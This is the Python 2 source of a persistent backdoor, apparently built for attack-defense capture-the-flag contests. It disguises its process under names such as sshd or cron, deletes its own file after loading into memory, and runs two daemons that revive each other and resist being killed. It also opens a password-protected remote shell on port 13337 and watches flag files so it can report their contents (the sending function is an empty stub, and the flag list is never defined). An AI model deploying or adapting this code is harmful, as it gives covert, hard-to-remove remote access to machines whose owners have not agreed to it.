#! /usr/bin/python
# coding: utf-8

import sys, os, signal, random, time, socket, subprocess, threading
fileList = {"file":""}
nameList = ['init', 'pwn1', 'socat', 'sshd', 'rcu_sched', 'getty', 'ps', 'cron', 'kthreadd']
DAEMONID = -1
fileData = ''
opid = 0
flag = 1
wpid = -1
onStart = 0
ni = open('/dev/null', 'r').fileno()
no = open('/dev/null', 'w').fileno()


def startWork():
    global wpid
    global onStart
    fileName = '/tmp/backDoor' + str(random.randint(0, 2000))
    fp = open(fileName, 'w')
    fp.write(fileData)
    fp.close()
    w = os.popen('/usr/bin/python ' + fileName + ' work', 'r', 0)
    wpid = int(w.read())
    onStart = 0
    os.unlink(fileName)


def restart():
    tmpName = os.tmpnam()
    fp = open(tmpName, 'w')
    fp.write(fileData)
    fp.close()
    os.execv('/usr/bin/python', ['python', tmpName])
    sys.exit(0)


def getQuit(sig, frame):
    signal.signal(signal.SIGTERM, signal.SIG_IGN)
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    signal.signal(signal.SIGUSR1, signal.SIG_IGN)
    signal.signal(signal.SIGUSR2, signal.SIG_IGN)
    signal.signal(signal.SIGQUIT, signal.SIG_IGN)
    signal.signal(signal.SIGPIPE, signal.SIG_IGN)
    try:
        if DAEMONID == 1:
            time.sleep(0.5)
        os.kill(opid, signal.SIGKILL)
    except:
        pass
    try:
        if wpid != -1:
            os.kill(wpid, signal.SIGKILL)
    except:
        pass
    global flag
    if flag == 1:
        flag = 0
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
        restart()


def daemonize(stdin, stdout, stderr='/dev/null'):
    # fork and exit father
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError, e:
        sys.stderr.write('ID %d \nfork #1 failed: (%d) %s\n' % (DAEMONID, e.errno, e.strerror))
        sys.exit(1)
    os.chdir('/')  # change word dir to root
    os.umask(0)
    os.setsid()

    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError, e:
        sys.stderr.write('ID %d \nfork #2 failed: (%d) %s \n' % (DAEMONID, e.errno, e.strerror))
        sys.exit(1)

    if len(sys.argv) >= 2:
        if sys.argv[1] == 'work':
            print os.getpid()
    for f in sys.stdout, sys.stderr:
        f.flush()

    se = open(stderr, 'a+', 0)
    if stdin != sys.stdin.fileno():
        os.dup2(stdin, sys.stdin.fileno())
    if stdout != sys.stdout.fileno():
        os.dup2(stdout, sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())


def creteDeamo():
    global DAEMONID
    global opid
    global onStart

    fd0 = os.pipe()  # id 0 write and id 1 read
    fd1 = os.pipe()  # id 1 write and id 0 read

    # crteat two deamon and use pipe to change data
    try:
        pid = os.fork()
        if pid > 0:
            DAEMONID = 0
            daemonize(stdin=fd1[0], stdout=fd0[1], stderr='/tmp/out1')
        else:
            DAEMONID = 1
            daemonize(stdin=fd0[0], stdout=fd1[1], stderr='/tmp/out2')
    except OSError, e:
        sys.stderr.write('fork #0 failed: (%d) %s \n' % (e.errno, e.strerror))
        sys.exit(1)

    # hook some signal
    signal.signal(signal.SIGTERM, getQuit)
    signal.signal(signal.SIGINT, getQuit)
    signal.signal(signal.SIGUSR1, getQuit)
    signal.signal(signal.SIGUSR2, getQuit)
    signal.signal(signal.SIGQUIT, getQuit)
    signal.signal(signal.SIGPIPE, getQuit)

    # no need this
    for f in fd1:
        os.close(f)
    for f in fd0:
        os.close(f)

    # change pid
    print os.getpid()
    sys.stdout.flush()
    opid = int(raw_input())

    # sys.stderr.write("I am process %d, The daemon id is %d" % (os.getpid(), DAEMONID))
    # sys.stderr.write("The other one's id is %d" % (opid))

    while True:
        try:
            os.kill(opid, 0)
            time.sleep(0.001)
        except OSError:
            getQuit(0, 0)

        if DAEMONID == 0 and onStart == 0:
            try:
                os.kill(wpid, 0)
            except OSError:
                onStart = 1
                signal.signal(signal.SIGALRM, getQuit)
                signal.alarm(30)


# get random name in list
def getRandom(List):
    return List[random.randint(0, len(List) - 1)]


def hide():
    # just for fun
    fp = open('/proc/self/comm', 'w')
    fp.write(getRandom(nameList))
    fp.close()

    # get back door path
    fp = open('/proc/self/cmdline', 'r')
    cmdline = fp.read()
    filename = cmdline.split('\x00')[1]
    fp.close()

    # get backdoor to mem
    global fileData
    fp = open(filename)
    fileData = fp.read()
    fp.close()

    # no local file
    os.unlink(filename)


def daemon():
    hide()
    startWork()
    creteDeamo()


def shell():
    daemonize(ni, no)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 13337))
    server.listen(5)
    sys.stderr.write('start wait connect')
    while True:
        talk, addr = server.accept()
        talk.send('passwd:')
        passwd = talk.recv(1024)
        if passwd.strip() == "misaka":
            def sh(handle):
                print handle
                proc = subprocess.Popen(["/bin/sh", "-i"], stdin=handle, stdout=handle, stderr=handle, shell=True)
                proc.wait()

            threading.Thread(target=sh, args=(talk,)).start()
        else:
            talk.send('bye')

def sendflag():
    pass

def work():
    daemonize(ni, no)

    pid = os.fork()
    if pid == 0:
        shell()
    while True:
        for fname in flagList:
            fp = open(fname) 
            flag = fp.read()
            if flag.strip() != flagList[fname]:
                flagList[fname] = flag.strip()
                sendflag(flag)
            fp.close()
        time.sleep(5)


if __name__ == "__main__":
    if len(sys.argv) >= 2:
        if sys.argv[1] == 'work':
            work()
    else:
        daemon()
